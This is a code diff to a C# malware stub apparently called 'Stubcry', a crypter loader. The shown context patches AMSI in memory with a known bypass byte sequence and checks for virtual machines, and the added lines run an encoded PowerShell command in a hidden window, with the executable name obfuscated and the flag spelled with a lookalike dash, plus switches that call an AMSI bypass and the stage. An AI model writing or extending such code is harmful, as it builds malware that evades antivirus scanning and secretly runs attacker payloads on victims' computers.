@@ -239,6 +239,25 @@ namespace Stubcry
             byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
             Marshal.Copy(patch, 0, address, 6);
         }
+        static string PowershellStage(string encodedCommand)
+        {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = FOKSTRING("MgY/cB4yNg9FF0YwEig=", "@mM^gKDz#r4ZpKvI");
+            psi.Arguments = "–eNco " + encodedCommand;
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+
+            using (Process process = Process.Start(psi))
+            {
+                process.WaitForExit();
+            }
+
+            return string.Empty;
+
+        }
+
+
+
         static bool IsRunningInVirtualEnvironment()
         {
 
@@ -273,6 +292,15 @@ namespace Stubcry
 
                 }
 
+            }
+            if (config.ispassamsi == true)
+            {
+                nikamsi();
+
+            }
+            if (config.ispwcommand == true)
+            {
+                PowershellStage(config.command);
             }
             if (!Directory.Exists(config.folder) && config.ispersist == true)
             {
